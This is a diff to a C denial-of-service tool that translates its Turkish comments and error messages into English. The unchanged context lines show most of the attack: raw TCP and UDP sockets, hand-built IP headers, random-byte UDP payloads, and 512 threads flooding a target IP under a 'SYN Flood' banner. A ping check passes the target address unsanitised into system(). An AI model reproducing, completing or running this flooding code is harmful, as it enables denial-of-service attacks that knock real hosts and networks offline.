@@ -19,7 +19,7 @@
 #define PACKET_SIZE  4096
 #define THREAD_COUNT 512
 
-//golobal
+// Global state
 int row;
 int port_select;
                                                                                                                                     
@@ -75,12 +75,12 @@ static unsigned short checksum(unsigned short *ptr, int nbytes) {
 
 int is_target_online(const char *ip) {
     char command[100];
-    // -c 1: 1 paket gönder, -W 1: timeout 1 saniye (Linux için)
+    // -c 1: send one packet; -W 1: one-second timeout on Linux
     snprintf(command, sizeof(command), "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
     
     int status = system(command);
     
-    // system() 0 dönerse ping başarılı olmuştur
+    // A zero system() result indicates a successful ping
     return (status == 0);
 }
 
@@ -96,7 +96,7 @@ static void *flood(void *arg)
     // TCP socket
     int sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock_tcp < 0) {
-        perror("TCP socket oluşturulamadı");
+        perror("Failed to create TCP socket");
         pthread_exit(NULL);
     }
 
@@ -110,7 +110,7 @@ static void *flood(void *arg)
     // UDP socket
     int sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
     if (sock_udp < 0) {
-        perror("UDP socket oluşturulamadı");
+        perror("Failed to create UDP socket");
         close(sock_tcp);
         pthread_exit(NULL);
     }
@@ -132,7 +132,7 @@ static void *flood(void *arg)
         struct iphdr *iph = (struct iphdr *)datagram;
         struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
 
-        // IP header TCP için
+        // IP header for TCP
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
@@ -183,16 +183,16 @@ static void *flood(void *arg)
         iph = (struct iphdr *)datagram;
         struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
 
-        // Rastgele payload uzunluğu belirle (32-512 byte)
+        // Choose a random payload length (32-512 bytes)
         int payload_len = (rand() % 480) + 32; 
         char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
 
-        // Rastgele içerik oluştur
+        // Generate random payload contents
         for (int i = 0; i < payload_len; i++) {
-            payload[i] = (char)(rand() % 256); // 0-255 arası byte
+            payload[i] = (char)(rand() % 256); // Byte in the range 0-255
         }
 
-        // IP header (UDP için)
+        // IP header for UDP
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
@@ -217,7 +217,7 @@ static void *flood(void *arg)
         udph->len = htons(sizeof(struct udphdr) + payload_len);
         udph->check = 0;
 
-        // UDP checksum için pseudo header
+        // Pseudo-header for the UDP checksum
         struct pseudo_header psh_udp;
         psh_udp.source_address = iph->saddr;
         psh_udp.dest_address = iph->daddr;
@@ -232,7 +232,7 @@ static void *flood(void *arg)
         udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
         free(pseudogram_udp);
 
-        // Paketi gönder
+        // Send the packet
         sendto(sock_udp, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
 
     }
@@ -245,7 +245,7 @@ static void *flood(void *arg)
 
 void *flood_animation(void *arg)
 {
-    const char *target_ip = (const char *)arg; // burayı ekle
+    const char *target_ip = (const char *)arg; // Target supplied by the caller
     int cerceve_sayisi = 4;
     struct timespec bekleme = {0, 600000000}; // 600ms
     const char *dots[] = {".  ", ".. ", "...", "...."};
@@ -263,7 +263,7 @@ void *flood_animation(void *arg)
             printf("\033[J");
 
             printf("\033[40m\033[1;31m[*] \033[1;34mSYN Flood \033[0m"
-                   "\033[40m\033[1;33m%s \033[1;37müzerinde "
+                   "\033[40m\033[1;33m%s \033[1;37mon "
                    "\033[40m\033[1;33m%d \033[1;37"
                    "\033[1;32m%d \033[1;37mthread%s\033[0m\n\n",
                     target_ip,port_select, THREAD_COUNT, dots[i]);
@@ -310,14 +310,14 @@ int SYN_Flood(const char *target_ip) {
     srand(time(NULL));
 
     if (pthread_create(&animasyon_thread, NULL, flood_animation, (void *)target_ip) != 0) {
-        fprintf(stderr, "Animasyon thread'i oluşturulamadı\n");
+        fprintf(stderr, "Failed to create animation thread\n");
         return 1;
     }
 
     // Create flood threads
     for (int i = 0; i < THREAD_COUNT; i++) {
         if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
-            fprintf(stderr, "Thread %d oluşturulamadı\n", i);
+            fprintf(stderr, "Failed to create thread %d\n", i);
         }
     }
 
